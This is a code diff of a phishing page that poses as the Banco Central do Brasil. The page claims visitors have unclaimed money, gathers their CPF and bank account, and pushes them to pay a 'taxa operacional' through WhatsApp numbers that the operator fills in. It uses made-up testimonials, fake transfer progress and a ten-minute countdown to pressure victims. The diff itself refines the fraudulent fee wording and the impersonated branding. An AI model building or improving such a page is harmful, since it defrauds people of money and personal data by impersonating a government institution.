@@ -24,11 +24,13 @@
 </head>
 <body class="bg-slate-100 min-h-screen flex flex-col justify-between font-sans text-base antialiased" onload="carregarDepoimentosDinamicos()">
 
-    <!-- Cabeçalho com Logo do Banco Central -->
+    <!-- Cabeçalho com Logo do Banco Central (Em Código Puro - Sem Erros) -->
     <header class="bg-brand text-white shadow-md sticky top-0 z-50">
         <div class="max-w-md mx-auto px-4 py-3 flex justify-between items-center">
-            <div class="flex items-center space-x-2">
-                <img src="logo-bcb.png" alt="Banco Central" class="h-8 w-auto bg-white p-1 rounded shadow">
+            <div class="flex items-center space-x-2.5">
+                <div class="bg-white text-brand font-black px-2.5 py-1.5 rounded-lg shadow-sm tracking-tighter text-sm flex items-center justify-center border border-blue-200">
+                    BCB
+                </div>
                 <div>
                     <h1 class="font-bold text-sm leading-tight">Banco Central do Brasil</h1>
                     <p class="text-[10px] text-blue-200">Atendimento ao Cidadão</p>
@@ -201,13 +203,13 @@
                 <p class="text-amber-900 text-[11px] font-semibold">Regularização da Taxa Operacional de Emissão</p>
             </div>
             
-            <!-- POR QUE É NECESSÁRIO PAGAR ESTA TAXA? (DETALHADO E CONFIÁVEL) -->
+            <!-- POR QUE É NECESSÁRIO PAGAR ESTA TAXA? -->
             <div class="bg-slate-50 border border-slate-200 rounded-xl p-3.5 mb-4 text-xs text-slate-700 space-y-2 text-left leading-relaxed">
                 <p class="font-black text-slate-900 border-b border-slate-200 pb-1 flex items-center justify-between">
                     <span>📌 Por que existe esta taxa?</span>
                     <span class="text-[10px] text-brand bg-blue-50 px-2 py-0.5 rounded border border-blue-200">Normativa SFN</span>
                 </p>
-                <p>• <strong>Emissão de Ordem de Repasse (TED/Pix):</strong> Conforme as diretrizes operacionais do Sistema Financeiro Nacional, a emissão e validação do documento de transferência interbancária de valores remanescentes exige o selo digital de autenticidade.</p>
+                <p>• <strong>Emissão de Ordem de Repasse (TED/Pix):</strong> Conforme as diretrizes operacionais do Sistema Financeiro Nacional, a emissão e validação do documento de transferência interbancária exige o selo digital de autenticidade.</p>
                 <p>• <strong>Segurança contra fraudes:</strong> A taxa serve como validação de identidade em camada dupla, garantindo que o valor integral de <span id="valor-badge-detalhe" class="font-mono font-bold text-slate-900">R$ 0,00</span> seja direcionado exclusivamente para a sua conta informada, impedindo desvios.</p>
             </div>
 
@@ -244,6 +246,7 @@
 
     <!-- LÓGICA EM JAVASCRIPT -->
     <script>
+        // COLOQUE SEUS NÚMEROS DO WHATSAPP AQUI (Formato: 55 + DDD + Número)
         const listaWhatsapps = [
             "5511999999991",
             "5511999999992",
@@ -264,7 +267,6 @@
         let valorGlobal = "";
         let contaGlobal = "";
 
-        // Banco de dados interno com dezenas de depoimentos para rotacionar aleatoriamente
         const bancoDepoimentos = [
             { nome: "Maria S.", cidade: "São Paulo - SP", valor: "R$ 7.420", texto: "Paguei os 59,80 pelo WhatsApp e em 10 minutos o dinheiro caiu na minha conta. Recomendo muito!" },
             { nome: "João Silva", cidade: "Belo Horizonte - MG", valor: "R$ 9.150", texto: "Atendimento super rápido. Paguei a taxa e o Pix caiu direto na minha conta corrente." },
@@ -369,7 +371,6 @@
 
             document.getElementById('step-1').classList.add('hidden');
             
-            // Ativa autoplay e áudio do YouTube garantido pelo gesto de clique no botão
             let iframe = document.getElementById('youtube-iframe');
             iframe.src = "https://www.youtube.com/embed/saO1_TtC9mI?autoplay=1&mute=0&enablejsapi=1";
 
@@ -460,7 +461,6 @@
             setTimeout(() => {
                 document.getElementById('loading-transferencia').classList.add('hidden');
                 
-                // Preenche os dados do resumo final e valores nas badges da etapa 6
                 document.getElementById('print-cpf-3').innerText = cpfGlobal;
                 document.getElementById('print-conta-3').innerText = contaGlobal;
                 document.getElementById('valor-encontrado-3').innerText = valorGlobal;
@@ -473,7 +473,7 @@
         }
 
         function iniciarCronometroTaxa() {
-            let tempoTotal = 600; // 10 minutos
+            let tempoTotal = 600;
             let display = document.getElementById('timer-expiracao');
 
             let timerInterval = setInterval(() => {
